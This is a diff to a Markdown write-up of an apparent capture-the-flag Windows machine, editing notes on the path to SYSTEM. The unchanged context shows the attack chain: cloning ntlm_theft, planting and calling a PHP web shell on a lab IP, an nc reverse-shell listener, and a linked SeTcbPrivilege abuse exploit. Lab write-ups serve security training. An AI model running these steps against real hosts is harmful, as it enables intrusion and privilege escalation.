@@ -5,7 +5,7 @@
 - Difficulty: Medium
 - Type: SeTcbPrivilege, Active Directory, Windows
 #### Enumeration
-![[Medium/Media/upload form.png]]
+![[Medium/Windows/Media/upload form.png]]
 #### Initial Foothold 
 ```bash
 $ git clone https://github.com/Greenwolf/ntlm_theft.git
@@ -167,7 +167,6 @@ d-----         10/2/2023  10:27 AM                js
 -a----         10/9/2025   7:12 AM             35 webshell.php
 ```
 - access web shell at `http://10.129.234.67/webshell.php?cmd=whoami`
-![[Pasted image 20251009071627.png]]
 - send a reverse shell payload 
 ```bash
 $ nc -lnvp 4444
@@ -193,7 +192,7 @@ SeCreateGlobalPrivilege       Create global objects               Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
 SeTimeZonePrivilege           Change the time zone                Disabled
 ```
-- user has `SeTcbPrivilege` privilege
+- `SeTcbPrivilege` is present in the Local Service token but currently disabled. Token privileges commonly appear disabled until a process enables them; the PoC below enables and abuses it to obtain a SYSTEM token.
 - search online and found post `https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e`
 - [POC here](https://github.com/b4lisong/SeTcbPrivilege-Abuse/blob/main/TcbElevation-x64.exe)
 - download the POC executable and reverse shell executable 
